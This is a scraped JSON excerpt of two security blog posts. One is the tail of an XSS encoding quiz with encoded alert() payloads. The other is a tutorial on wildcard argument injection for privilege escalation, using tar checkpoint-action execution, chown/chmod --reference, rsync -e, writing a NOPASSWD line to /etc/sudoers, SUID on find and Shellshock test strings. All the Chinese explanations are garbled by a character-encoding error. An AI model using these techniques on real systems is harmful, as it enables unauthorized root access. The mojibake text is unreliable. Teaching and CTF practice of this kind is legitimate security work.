onclick=\u0026quot;confirm('8\\u0027);\u0026quot;\u0026gt;Button\u0026lt;/button\u0026gt;\nUnicode escape sequence encoded '\nAnswer: The javascript will NOT execute.\nExplanation: å­˜åœ¨å­—ç¬¦ä¸²ä¸­ï¼Œä¸ä¼šè¢«è§£ææˆ'\n   \u0026lt;script\u0026gt;\u0026amp;#97;\u0026amp;#108;\u0026amp;#101;\u0026amp;#114;\u0026amp;#116\u0026amp;#40;\u0026amp;#57;\u0026amp;#41;\u0026amp;#59\u0026lt;/script\u0026gt;\nCharacter entity encoded alert(9);\nAnswer: The javascript will NOT execute.\nExplanation: ç”± js è§£æå™¨è§£æï¼Œå¹¶ä¸ä¼šäº¤ç”± HTML è§£æå™¨è§£æï¼Œæ‰€ä»¥ä¸è¯†åˆ«ï¼Œä¸æ‰§è¡Œ\n  \u0026lt;script\u0026gt;\\u0061\\u006c\\u0065\\u0072\\u0074(10);\u0026lt;/script\u0026gt;\n  Unicode Escape sequence encoded alert\nAnswer: The javascript will execute.\nExplanation: ç”± js è§£æå™¨è§£æï¼Œå±äº js çš„ç¼–ç ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œ\n \u0026lt;script\u0026gt;\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029\u0026lt;/script\u0026gt;\nUnicode Escape sequence encoded alert(11)\nAnswer: The javascript will NOT execute.\nExplanation: ç”± js è§£æå™¨è§£æï¼Œå±äº js çš„ç¼–ç ï¼Œä½†æ˜¯ç¼–ç äº†(ã€)ï¼Œè€Œè¿™ä¸¤ä¸ªå±äºæ§åˆ¶å­—ç¬¦ï¼Œä¸ä¼šè¢«æ­£å¸¸è§£æ\n  \u0026lt;script\u0026gt;\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)\u0026lt;/script\u0026gt;\nUnicode Escape sequence encoded alert and 12\nAnswer: The javascript will NOT execute.\nExplanation: è¦ä¹ˆæ˜¯å› ä¸º\\u0031\\u0032ä¸ä¼šè¢«è§£é‡Šä¸ºå­—ç¬¦ä¸²å¸¸é‡ï¼ˆå› ä¸ºå®ƒä»¬æ²¡æœ‰ç”¨å¼•å·é—­åˆï¼‰è¦ä¹ˆæ˜¯å› ä¸ºå®ƒä»¬æ˜¯ ASCII å‹æ•°å­—ã€‚\n  \u0026lt;script\u0026gt;alert('13\\u0027)\u0026lt;/script\u0026gt;\nUnicode escape sequence encoded '\nAnswer: The javascript will NOT execute.\nExplanation: åœ¨å­—ç¬¦ä¸²ä¸­ï¼Œè¢«è§£ææˆå­—ç¬¦ä¸²\n  \u0026lt;script\u0026gt;alert('14\\u000a')\u0026lt;/script\u0026gt;\nUnicode escape sequence encoded line feed.\nAnswer: The javascript will execute.\nExplanation: \\u000aä¼šè¢«è§£é‡Šæˆæ¢è¡Œç¬¦æ–‡æœ¬ï¼Œè¿™å¹¶ä¸ä¼šå¯¼è‡´çœŸæ­£çš„æ¢è¡Œä»è€Œå¼•å‘ JavaScript è¯­æ³•é”™è¯¯ã€‚\n  \u0026lt;a href=\u0026quot;\u0026amp;#x6a;\u0026amp;#x61;\u0026amp;#x76;\u0026amp;#x61;\u0026amp;#x73;\u0026amp;#x63;\u0026amp;#x72;\u0026amp;#x69;\u0026amp;#x70;\u0026amp;#x74;\u0026amp;#x3a;\u0026amp;#x25;\u0026amp;#x35;\u0026amp;#x63;\u0026amp;#x25;\u0026amp;#x37;\u0026amp;#x35;\u0026amp;#x25;\u0026amp;#x33;\u0026amp;#x30;\u0026amp;#x25;\u0026amp;#x33;\u0026amp;#x30;\u0026amp;#x25;\u0026amp;#x33;\u0026amp;#x36;\u0026amp;#x25;\u0026amp;#x33;\u0026amp;#x31;\u0026amp;#x25;\u0026amp;#x35;\u0026amp;#x63;\u0026amp;#x25;\u0026amp;#x37;\u0026amp;#x35;\u0026amp;#x25;\u0026amp;#x33;\u0026amp;#x30;\u0026amp;#x25;\u0026amp;#x33;\u0026amp;#x30;\u0026amp;#x25;\u0026amp;#x33;\u0026amp;#x36;\u0026amp;#x25;\u0026amp;#x36;\u0026amp;#x33;\u0026amp;#x25;\u0026amp;#x35;\u0026amp;#x63;\u0026amp;#x25;\u0026amp;#x37;\u0026amp;#x35;\u0026amp;#x25;\u0026amp;#x33;\u0026amp;#x30;\u0026amp;#x25;\u0026amp;#x33;\u0026amp;#x30;\u0026amp;#x25;\u0026amp;#x33;\u0026amp;#x36;\u0026amp;#x25;\u0026amp;#x33;\u0026amp;#x35;\u0026amp;#x25;\u0026amp;#x35;\u0026amp;#x63;\u0026amp;#x25;\u0026amp;#x37;\u0026amp;#x35;\u0026amp;#x25;\u0026amp;#x33;\u0026amp;#x30;\u0026amp;#x25;\u0026amp;#x33;\u0026amp;#x30;\u0026amp;#x25;\u0026amp;#x33;\u0026amp;#x37;\u0026amp;#x25;\u0026amp;#x33;\u0026amp;#x32;\u0026amp;#x25;\u0026amp;#x35;\u0026amp;#x63;\u0026amp;#x25;\u0026amp;#x37;\u0026amp;#x35;\u0026amp;#x25;\u0026amp;#x33;\u0026amp;#x30;\u0026amp;#x25;\u0026amp;#x33;\u0026amp;#x30;\u0026amp;#x25;\u0026amp;#x33;\u0026amp;#x37;\u0026amp;#x25;\u0026amp;#x33;\u0026amp;#x34;\u0026amp;#x28;\u0026amp;#x31;\u0026amp;#x35;\u0026amp;#x29;\u0026quot;\u0026gt;\u0026lt;/a\u0026gt;\nAnswer: The javascript will execute.\nExplanation: å‚ç…§ Example 3\n  Reference mXSSç®€è¿°\næµ…è°ˆXSSâ€”å­—ç¬¦ç¼–ç å’Œæµè§ˆå™¨è§£æåŸç†\nXSSæµ‹è¯•å¤‡å¿˜å½•\nDeep dive into browser parsing and XSS payload encoding\næµè§ˆå™¨çš„æ¸²æŸ“ï¼šè¿‡ç¨‹ä¸åŸç†\nXSSå°ç»“\nCross-site Scripting (XSS)\n","date":"2019-03-13T00:54:19Z","permalink":"https://blog.zeddyu.info/2019/03/13/Web%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B-XSS-I/","title":"Webå®‰å…¨ä»é›¶å¼€å§‹-XSS I"},{"content":" â€‹\tæ–‡ç« é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºï¼šhttps://xz.aliyun.com/t/4309\n ä¹‹å‰åœ¨è¡¥å¤©å¹³å°é¦–å‘äº†å·§ç”¨å‘½ä»¤æ³¨å…¥çš„Nç§æ–¹å¼ï¼Œçœ‹åˆ°äº†æœ‰å‡ ä¸ªå¸ˆå‚…è¡ç”Ÿå‡ºäº†ä¸åŒçš„å‡ ä¸ªåç»­ç‰ˆæœ¬ï¼Œéƒ½æ„Ÿè§‰æŒºä¸é”™çš„ï¼Œå¯¹æˆ‘çš„ç‰ˆæœ¬è¿›è¡Œäº†ä¸€äº›è¡¥å……ã€‚æœ¬æ¥è¿™ä¸ªæ€»ç»“åº”è¯¥ç®—æ˜¯å‰åŠéƒ¨åˆ†ï¼Œæƒ³å†™çš„è¿˜æ²¡å†™å®Œï¼Œå½“æ—¶åˆæ˜¯åœ¨è€ƒè¯•å‘¨ï¼ŒåŸæœ¬æƒ³åœ¨è€ƒè¯•ç»“æŸåå°±æ¥å†™ååŠéƒ¨åˆ†ï¼Œåˆå› ä¸ºå„ç§äº‹ç»™æ¨æ‰äº†ã€‚æ‰€ä»¥ç°åœ¨æ¥å†™ååŠéƒ¨åˆ†æå‡ç¯‡ï¼Œä¹Ÿç®—æ˜¯å¯¹å‰åŠéƒ¨åˆ†çš„è¡¥å……ä¸è§£é‡Šã€‚\n[TOC]\nææƒ è¿™é‡Œæˆ‘ä»¬è®²è®²åœ¨å‘½ä»¤æ³¨å…¥ä¸­æ›´æœ‰æ„æ€çš„ä¸€ç§æ–¹æ³•ã€‚\nWildcard Wilderness Example 1 é¦–å…ˆæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸ªç¤ºä¾‹\necho \u0026#34;Hello Friends\u0026#34; \u0026gt; file1 echo \u0026#34;This is wildcard Injection\u0026#34; \u0026gt;file2 echo \u0026#34;take help\u0026#34; \u0026gt; --help  \né¦–å…ˆåˆ›å»ºå‡ ä¸ªæ–‡ä»¶ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªæ˜¯--helpï¼Œç„¶åä½¿ç”¨catå‘½ä»¤è¯»å–æ–‡ä»¶å†…å®¹\ncat file1 cat file 2 cat --help  \nå¦‚æœæŒ‰ç…§æˆ‘ä»¬é¢„æœŸçš„ï¼Œæ˜¯ä¸æ˜¯åœ¨ç¬¬ä¸‰ä¸ªcat --helpå¤„åº”è¯¥æ˜¯è¦è¯»å–â€”helpæ–‡ä»¶çš„å†…å®¹å‘¢ï¼Ÿç„¶è€Œæˆ‘ä»¬æ‰§è¡Œcat â€”helpå´ä¼˜å…ˆæ‰§è¡Œäº†catå‘½ä»¤çš„å¸®åŠ©é€‰é¡¹ï¼Œå¹¶æ²¡æœ‰è¯»å‡ºâ€”helpé‡Œçš„å†…å®¹ã€‚\nä¸ä»…æ˜¯catï¼Œlsç­‰å‘½ä»¤ä¹Ÿä¼šä¼˜å…ˆè°ƒç”¨å†…ç½®--helpé€‰é¡¹ã€‚\n \nä»¥åŠè¿˜æœ‰--allé€‰é¡¹ã€‚\n \nå…¶å®è®²é“ç†ï¼Œè¯æ³•åˆ†ææŠŠå¯¹è¯¸å¦‚--helpã€--allç­‰é€‰é¡¹ä¼˜å…ˆå¤„ç†ä¸ºå†…ç½®é€‰é¡¹è¾“å‡ºï¼Œçœ‹èµ·æ¥å¹¶æ²¡æœ‰ä»»ä½•é—®é¢˜\nè¿™ä¸ªæŠ€å·§å«åšWildcard wildnessï¼Œä¸­æ–‡æœ‰äººè¯‘ä¸ºé€šé…ç¬¦åœ¨é‡ã€‚(-allã€--helpå¯ä»¥é€šè¿‡åŠ å…¥./æˆ./-allã€./--helpæ¥ç‰¹æŒ‡è¿™ä¸ªæ–‡ä»¶ï¼Œé¿å…è¿™ä¸ªé—®é¢˜)\nExample 2  \nå¦‚å›¾ï¼Œæˆ‘ä»¬æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œå½“ç”¨rm *çš„æ—¶å€™ï¼Œåªåˆ æ‰äº†file1ä¸file2ï¼Œå¹¶æ²¡æœ‰åˆ é™¤*\n \næˆ–è€…ä½¿ç”¨rm file1 file2 -rfé€ä¸ªåˆ é™¤ä¹‹æ—¶ï¼Œä¹Ÿåªåˆ æ‰äº†file1ä¸file2\nä½¿ç”¨strace rm *æˆ‘ä»¬å¯ä»¥å‘ç°\n \nç”±äºå½“å‰ç›®å½•ä¸­å­˜åœ¨-rfæ–‡ä»¶åï¼Œrmå°†-rfé€‰é¡¹ä½œä¸ºæœ€åä¸€ä¸ªå‚æ•°ï¼Œå¹¶ä¸”é€’å½’åˆ é™¤å½“å‰ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶ã€‚åŒæ ·ï¼Œè‹¥è¦åˆ é™¤å¯ä»¥åŠ ä¸Š./-rfè¿›è¡Œåˆ é™¤\nTrick æˆ‘ä»¬å¯ä»¥åˆ©ç”¨Wildcard Wildernessåšä¸€äº›æ›´æœ‰ç”¨çš„äº‹æƒ…ã€‚\nFile Owner Hijacking ç°åœ¨æˆ‘ä»¬æœ‰ä¸‰ä¸ªç”¨æˆ·ï¼Œä¸€ä¸ªzeddï¼Œä¸€ä¸ªtestï¼Œä¸€ä¸ªrootç”¨æˆ·ã€‚\næˆ‘ä»¬åˆ†åˆ«ç”¨zeddä¸teståˆ›å»ºäº†ä¸åŒçš„æ–‡ä»¶ï¼Œ1.phpä¸test.phpéƒ½å±äºtestç”¨æˆ·çš„æ–‡ä»¶ï¼Œzedd.phpä¸--reference=zedd.phpå‡å±äºzeddç”¨æˆ·çš„æ–‡ä»¶ã€‚\n \nç„¶åä½¿ç”¨rootç”¨æˆ·ä½¿ç”¨chown -R test:test *.phpå‘½ä»¤ï¼Œæƒ³æŠŠæœ¬ç›®å½•ä¸‹æ‰€æœ‰çš„.phpæ–‡ä»¶ä¿®æ”¹ä¸ºtestç”¨æˆ·æ‰€æœ‰ã€‚\n \nä½†æ˜¯ç»“æœæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œç»“æœè¯¥ç›®å½•ä¸‹æ‰€æœ‰çš„.phpæ–‡ä»¶éƒ½è¢«ä¿®æ”¹ä¸ºäº†zeddç”¨æˆ·æ‰€æœ‰ï¼ŒæˆåŠŸâ€œææƒâ€ã€‚\nåŸç†æˆ‘ä»¬å¯ä»¥ç”¨strace chown -R zedd:zedd *.phpæ¥çœ‹ä¸€ä¸‹ï¼ˆæ³¨æ„è¿™é‡Œæ¢äº†ä¸€ä¸‹ï¼Œæ¨¡æ‹Ÿæƒ³æŠŠ.phpæ–‡ä»¶æ”¹å˜æˆzeddç”¨æˆ·æ‰€æœ‰ï¼‰\n \næˆ‘ä»¬å¯ä»¥çœ‹åˆ°\nexecve(\u0026#34;/bin/chown\u0026#34;, [\u0026#34;chown\u0026#34;, \u0026#34;-R\u0026#34;, \u0026#34;zedd:zedd\u0026#34;, \u0026#34;config.php\u0026#34;, \u0026#34;index.php\u0026#34;, \u0026#34;--reference=.backdoor.php\u0026#34;], 0x7ffe5b43b1e8 /* 35 vars */) = 0 è·Ÿæˆ‘ä»¬ä¸Šä¸ªä¾‹å­åŸç†å…¶å®ä¸€æ ·ï¼Œ--reference=.backdoor.phpè¢«ä½œä¸ºä¸€ä¸ªé€‰é¡¹è¿›è¡Œäº†å¤„ç†ï¼Œè€Œ\n--reference=RFILE use RFILE's owner and group rather than specifying OWNER:GROUP values --reference=RFILEè¿™ä¸ªé€‰é¡¹åˆ™æ˜¯ä½¿ç”¨RFILEçš„æ–‡ä»¶æ‹¥æœ‰è€…å’Œç”¨æˆ·ç»„æ¥æ”¹å˜æ–‡ä»¶å±æ€§ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ä¼ å…¥çš„OWNER:GROUPå‚æ•°ã€‚\nå› æ­¤ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œchownçš„--referenceé€‰é¡¹å°†è¦†ç›–æŒ‡å®šä¸ºrootç”¨æˆ·è¾“å…¥çš„å‚æ•°zedd:zeddï¼ŒæŠŠæ­¤ç›®å½•ä¸­æ‰€æœ‰.phpæ–‡ä»¶çš„æ‰€æœ‰è€…æ”¹å˜ä¸.backdoor.phpçš„æ‰€æœ‰è€…testã€‚\n \næ‰€ä»¥ï¼ŒæŒ‰ç…§è¿™ç§æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥åŠ«æŒrootå°†æ–‡ä»¶çš„æ‰€æœ‰æƒæ›´æ”¹ä¸ºä»»æ„ç”¨æˆ·ï¼Œå¹¶â€œåŠ«æŒâ€æˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶ã€‚\nChmod File Reference ç±»ä¼¼chownçš„è¿˜æœ‰ä¸€ä¸ªå‘½ä»¤chmodï¼Œå®ƒä¹Ÿæœ‰--reference=RFIEçš„é€‰é¡¹\n--reference=RFILE use RFILE\u0026#39;s mode instead of MODE values  \nä¸chownç±»ä¼¼ï¼Œå› ä¸ºæœ‰--reference=.backdoor.phpçš„å­˜åœ¨ï¼Œåœ¨ä½¿ç”¨chmod 000 *çš„æ—¶å€™ä¹Ÿä¼šæŠŠåŠ«æŒåˆ°ä¸.backdoor.phpæ–‡ä»¶æƒé™ä¸€æ ·çš„æƒé™\nTarå‘½ä»¤åˆ©ç”¨ é¦–å…ˆæˆ‘ä»¬æ¥çœ‹çœ‹tarå‘½ä»¤å¸®åŠ©æ–‡æ¡£ä¸­çš„å‡ ä¸ªæœ‰æ„æ€çš„é€‰é¡¹\n--checkpoint[=NUMBER] display progress messages every NUMBERth record (default 10) --checkpoint-action=ACTION execute ACTION on each checkpoint ä»å¸®åŠ©æ–‡æ¡£ï¼Œæˆ‘ä»¬å¤§è‡´å¯ä»¥ä»ä¸­ç†è§£åˆ°ï¼Œ--checkpoint=1å¯ä»¥ç”¨æ¥æ˜¾ç¤ºä¿¡æ¯ï¼Œ--checkpoint-action=exec=sh shell.shå¯ä»¥ç”¨æ¥æ‰§è¡Œå‘½ä»¤\nå…ˆå°è¯•æ„å»ºä¸€ä¸ªshell.shè„šæœ¬ï¼Œå†…å®¹ä¸º/usr/bin/idï¼Œä»¥åŠæ–‡ä»¶åä¸º--checkpoint=1ä¸--checkpoint-action=exec=sh shell.shçš„æ–‡ä»¶ï¼Œä½¿ç”¨tar -cf test.tar *æŠŠå½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶å‹ç¼©åˆ°test.tarå‹ç¼©åŒ…å†…\n \nå¯è§ï¼Œ/usr/bin/idå·²ç»è¢«æˆåŠŸæ‰§è¡Œè¾“å‡ºã€‚\n \nä¸ä¹‹å‰ä¸€æ ·ï¼Œ--checkpoint=1ä¸--checkpoint-action=exec=sh shell.shè¢«ä½œä¸ºé€‰é¡¹å¤„ç†\n \nåœ¨ 2018 SWPUCTF ä¸Šæœ‰ä¸€é“ web é¢˜è€ƒç‚¹ä¹Ÿæ­£æ˜¯åˆ©ç”¨äº†è¿™ä¸ªç‚¹ï¼Œç”±äºé¢˜ç›®å®˜æ–¹æ²¡æœ‰å¼€æºï¼Œè¿™é‡Œç»™ä¸€ä¸ªæ¯”è¾ƒè¯¦ç»†çš„ @ä¸€å¶é£˜é›¶ å¸ˆå‚…å†™çš„ wp ç”¨äºå‚è€ƒå­¦ä¹ : 2018SWPUCTF-Web#ä¿¡æ¯å†æ¬¡å‘æ˜\nrsyncå‘½ä»¤åˆ©ç”¨ rsyncå‘½ä»¤å¯èƒ½æ¯”è¾ƒå°‘ç”¨ï¼Œæˆ‘ä»¬è¿™é‡Œç®€å•ä»‹ç»ä¸€ä¸‹\n NAME\nâ€‹\trsync - a fast, versatile, remote (and local) file-copying tool\n rsyncå‘½ä»¤æ˜¯ä¸€ä¸ªè¿œç¨‹æ•°æ®åŒæ­¥å·¥å…·ï¼Œå¯é€šè¿‡LAN/WANå¿«é€ŸåŒæ­¥å¤šå°ä¸»æœºé—´çš„æ–‡ä»¶ã€‚ä½¿ç”¨ä¸€ä¸ªè¿œç¨‹shellç¨‹åº(å¦‚rshã€ssh)æ¥å®ç°å°†æœ¬åœ°æœºå™¨çš„å†…å®¹æ‹·è´åˆ°è¿œç¨‹æœºå™¨ã€‚å¦‚ï¼šrsync -t *.c foo:srcï¼Œå¤åˆ¶å½“å‰æœ¬åœ°æ–‡ä»¶å¤¹ä¸‹çš„æ‰€æœ‰çš„.cæ–‡ä»¶åˆ° foo è¿œç¨‹æœåŠ¡å™¨çš„/srcæ–‡ä»¶å¤¹ä¸‹ã€‚\nrsyncå¸®åŠ©æ–‡æ¡£å«æœ‰ä»¥ä¸‹å‡ ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„é€‰é¡¹\n-e, --rsh=COMMAND specify the remote shell to use --rsync-path=PROGRAM specify the rsync to run on remote machine --rsh=COMMANDåˆæ˜¯ä¸€ä¸ªæˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ï¼Œæˆ‘ä»¬é¦–å…ˆåˆ›å»ºä¸€ä¸ªæ–‡ä»¶åä¸º-e sh shell.cçš„æ–‡ä»¶ï¼Œç„¶åå†åˆ›å»ºä¸€ä¸ªshell.cæ–‡ä»¶ï¼Œæ±¡æŸ“rsyncå‚æ•°æ¥å®ç°æ‰§è¡Œæˆ‘ä»¬åœ¨shell.cä¸­å†™å…¥çš„é¢„æœŸå‘½ä»¤\nå‡è®¾å½“å‰ç›®å½•ä¸‹æˆ‘ä»¬æ‹¥æœ‰ä¸€ä¸ªåªæœ‰rootç”¨æˆ·å¯è¯»çš„rootfileæ–‡ä»¶ï¼Œç”±äºä¸èƒ½ç›´æ¥è¾“å‡ºç»“æœï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ cat ./rootfile \u0026gt; ./outputï¼Œå°†æ–‡ä»¶å†…å®¹è¯»å‡ºã€‚\n \nå¾—åˆ°çš„outputæ–‡ä»¶æ˜¯ 644 çš„æƒé™ï¼Œè¿™æ ·æˆ‘ä»¬å°±æˆåŠŸæ„é€ äº†ä¸€ä¸ªææƒè¯»å–çš„æ–‡ä»¶çš„ payload ï¼Œè¿™é‡Œå¯èƒ½éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåªèƒ½æå–åˆ°æ‰§è¡Œrsyncç”¨æˆ·çš„æƒé™ï¼Œä¸æ˜¯ç›´æ¥çš„rootæƒé™ï¼Œè¿™é‡Œå› ä¸ºæ‰§è¡Œå‘½ä»¤çš„æ˜¯rootæƒé™ï¼Œæ‰€ä»¥èƒ½è¯»å–åªæœ‰rootç”¨æˆ·æ‰èƒ½è¯»å–çš„rootfileæ–‡ä»¶\nTips   æ—¢ç„¶èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥å‚ç…§ä¸Šç¯‡åˆ—ä¸¾çš„åå¼¹ shell çš„æ–¹å¼å°† shell åå¼¹ç»™æˆ‘ä»¬ï¼Œä¹Ÿå¯ä»¥é…åˆmsfvenomæ¥ä½¿ç”¨ã€‚\n  tarå‘½ä»¤æ¯”è¾ƒå¤šçš„éƒ½ç”¨åœ¨/etc/crontabè®¡åˆ’ä»»åŠ¡ä¸­ï¼Œç»å¸¸ä¼šæœ‰ç®¡ç†å‘˜ä¼šç”¨crontabæ¥æ‰§è¡Œä¸€äº›tarå‘½ä»¤çš„å¤‡ä»½æ“ä½œï¼Œè€Œä¸”crontabæ‰§è¡Œçš„æƒé™è¿˜æ˜¯rootæƒé™ï¼Œæ‰€ä»¥è¿™æ˜¯ä¸ªå¾ˆå¥½åˆ©ç”¨çš„ç‚¹\n  tarå‘½ä»¤éœ€è¦è¿›å…¥åˆ°--checkpoint=1æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•å†…ï¼Œå¦‚æœåŠ ä¸Šç»å¯¹è·¯å¾„å°†ä¼šå¤±æ•ˆï¼Œä¾‹å¦‚tar cf test.tar /var/www/html/*\n \næˆ‘ä»¬å¯ä»¥çœ‹åˆ° shell å¤„ç†æ–¹å¼å°†/home/zedd/Desktop/testä¸ç›®å½•ä¸‹çš„æ–‡ä»¶åé€ä¸ªæ‹¼æ¥èµ·æ¥ï¼Œå°±è¾¾ä¸åˆ°æ±¡æŸ“å‚æ•°çš„æ•ˆæœäº†\n  è¿˜å¯ä»¥ç”¨echo \u0026quot;zedd ALL=(root) NOPASSWD: ALL\u0026quot; \u0026gt; /etc/sudoersï¼ŒæŠŠè‡ªå·±ç›´æ¥å†™å…¥ç®¡ç†å‘˜ç»„\n  åˆ©ç”¨chmod u+s /usr/bin/findæå‡ä¸ºrootæƒé™æ‰§è¡Œï¼Œé…åˆfindå‘½ä»¤çš„-exec COMMANDæ¥æ‰§è¡Œå‘½ä»¤ï¼Œä¾‹å¦‚find f1 -exec \u0026quot;whoami\u0026quot; \\;\n \n  æ–‡ç« ä¸­è®¨è®ºçš„æŠ€æœ¯å¯ä»¥ä»¥ä¸åŒçš„å½¢å¼åœ¨å„ç§æµè¡Œçš„Unixå·¥å…·ä¸Šåº”ç”¨ï¼Œè¿™é‡Œä»…ä»…æ˜¯æŠ›ç –å¼•ç‰ï¼Œåˆ—ä¸¾ä¸€éƒ¨åˆ†å‘½ä»¤ã€‚ åœ¨å®é™…æ”»å‡»ä¸­ï¼Œä»»æ„ shell é€‰é¡¹/å‚æ•°éƒ½å¯ä»¥éšè—åœ¨å¸¸è§„æ–‡ä»¶ä¸­ï¼Œç®¡ç†å‘˜ä¹Ÿä¸å®¹æ˜“å‘ç°ï¼Œæ¯”å¦‚ä½¿ç”¨.backdoor.phpç­‰å½¢å¼ã€‚\nOther è¿™é‡Œè®²è®²å‡ ä¸ªè™½ç„¶ä¸å±äºææƒï¼Œä½†æ˜¯ä¹Ÿæ¯”è¾ƒæœ‰æ„æ€çš„å‡ ä¸ªç‚¹ã€‚\nEcho echo *å¯ä»¥ç”¨æ¥æ˜¾ç¤ºç›®å½•ï¼Œecho /???gå¯ä»¥ç”¨æ¥æ¢æµ‹æ–‡ä»¶\n \nln  NAME\nâ€‹\tln - make links between files\n lnå‘½ä»¤å¸¸å¸¸ç”¨äºé“¾æ¥ä¸¤ä¸ªæ–‡ä»¶ï¼Œè€Œä¸”åˆ†ä¸¤ç§é“¾æ¥æ¨¡å¼ï¼Œä¸€ç§ç¡¬é“¾æ¥ä¸€ç§è½¯é“¾æ¥ï¼Œè¯¦ç»†å¯ä»¥å‚è€ƒç†è§£Linuxç¡¬é“¾æ¥ä¸è½¯é“¾æ¥ã€‚è¿™é‡Œä¸»è¦è®²è®²è½¯é“¾æ¥ï¼Œè½¯é“¾æ¥ç›¸å½“äºæˆ‘ä»¬ Windows ä¸­çš„å¿«æ·æ–¹å¼ï¼Œå¯ä»¥ä½¿ç”¨ln -såˆ›å»º\nä¾‹å¦‚ï¼Œè¿™é‡Œæˆ‘ä»¬æ ¹ç›®å½•ä¸‹æœ‰ä¸€ä¸ªæ–‡ä»¶å†…å®¹ä¸ºflag{xxx}çš„åä¸ºflagæ–‡ä»¶ï¼Œæˆ‘ä»¬ä½¿ç”¨ln -s /flag fileï¼Œåœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªfileæ–‡ä»¶é“¾æ¥åˆ°/flagï¼Œä½¿ç”¨cat fileä¸php -r \u0026quot;echo file_get_contents('file')\u0026quot; å‡å¯ä»¥è¯»å–åˆ°/flagçš„å†…å®¹ã€‚\n \nè¿™ä¸ªè½¯é“¾æ¥è¯»å–æ–‡ä»¶å†…å®¹å·²ç»è¢«å¤šæ¬¡åˆ©ç”¨\n åœ¨ GitLab CVE-2016-9086 ä¹Ÿæ˜¯åˆ©ç”¨äº†è¿™ç‚¹ï¼Œå‚è€ƒGitLab ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ (CVE-2016-9086) å’Œä»»æ„ç”¨æˆ· token æ³„éœ²æ¼æ´ CTF ä¸­ä¹Ÿå‡ºç°äº†ç±»ä¼¼çš„é¢˜ç›®ï¼Œå‚è€ƒä¸€ä¸ªæœ‰è¶£çš„ä»»æ„æ–‡ä»¶è¯»å–ï¼Œä»¥åŠåœ¨ 2018 å¹´èµ›åšåœ°çƒæ¯ä¸Šæœ‰ä¸€é“é¢˜ä¹Ÿæ˜¯åˆ©ç”¨è¿™ä¸ªç‚¹ï¼Œå‚è€ƒè®°å½•ä¸€é“é¢˜çš„å¤šç§è§£æ³•ï¼Œâ€œèµ›åšåœ°çƒæ¯â€å·¥ä¸šäº’è”ç½‘å®‰å…¨å¤§èµ›çº¿ä¸Šèµ›Writeup  ShellShock(CVE-2014-6271) Bash 4.3ä»¥åŠä¹‹å‰çš„ç‰ˆæœ¬åœ¨å¤„ç†æŸäº›æ„é€ çš„ç¯å¢ƒå˜é‡æ—¶å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œå‘ç¯å¢ƒå˜é‡å€¼å†…çš„å‡½æ•°å®šä¹‰åæ·»åŠ å¤šä½™çš„å­—ç¬¦ä¸²ä¼šè§¦å‘æ­¤æ¼æ´ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨æ­¤æ¼æ´æ”¹å˜æˆ–ç»•è¿‡ç¯å¢ƒé™åˆ¶ï¼Œä»¥æ‰§è¡Œä»»æ„çš„ shell å‘½ä»¤ï¼Œç”šè‡³å®Œå…¨æ§åˆ¶ç›®æ ‡ç³»ç»Ÿï¼Œè¯¦ç»†åˆ†æå‚è€ƒç ´å£³ï¼ˆShellShockï¼‰æ¼æ´æ ·æœ¬åˆ†ææŠ¥å‘Š\n   CVE-2014-6271 æµ‹è¯•æ–¹å¼:\nenv x='() { :;}; echo vulnerable' bash -c \u0026ldquo;echo this is a test\u0026rdquo;\n  CVE-2014-7169 æµ‹è¯•æ–¹å¼:(CVE-2014-6271è¡¥ä¸æ›´æ–°åä»ç„¶å¯ä»¥ç»•è¿‡) env -i X=';() { (a)=\u0026gt;' bash -c \u0026lsquo;echo date\u0026rsquo;; cat echo\n   ä»ä¸€é“é¢˜çœ‹Shell Shock é¢˜ç›®åœ°å€ï¼šcommand-executorâ€”â€”æ¥æºäº HackMe\né¢˜ç›®æè¿°ï¼š\n â€‹\tHere\u0026rsquo;s my useless developer assistant website, try to execute your own command!\n é¢˜ç›®å¤§ä½“æ€è·¯æ˜¯ï¼š\n è¯»å–æºç  Shell Shockå‘½ä»¤æ‰§è¡Œ é‡å®šå‘è¯»å†™æ–‡ä»¶  é¢˜ç›®è®¾ç½®ä¸ºå‡ ä¸ªåŠŸèƒ½ï¼Œä¸€ä¸ªmanå‘½ä»¤çš„å¸®åŠ©æ–‡æ¡£\n \né€‰æ‹©äº†lsï¼Œå¤šäº†ä¸ªè¯·æ±‚å‚æ•°file=ls\n \nå°è¯•ç”¨å…¶ä»–å‘½ä»¤ï¼Œæ¯”å¦‚find\n \nçŒœæµ‹eval(\u0026quot;man /bin/\u0026quot; + command)æˆ–è€…ä¸€äº›å…¶ä»–çš„ç›®å½•\nTar Testerç•Œé¢å¯ä»¥ä¸Šä¼ å‹ç¼©åŒ…ä½†æ˜¯å¹¶æ²¡æœ‰è§£å‹ï¼Œåªæ˜¯tar -tvf test.taræŸ¥çœ‹å‹ç¼©åŒ…å†…çš„å†…å®¹\n \nCmd Execç•Œé¢åªæœ‰ä¸¤ä¸ªå‘½ä»¤ï¼Œä¸€ä¸ªlsï¼Œä¸€ä¸ªenv\n \nList 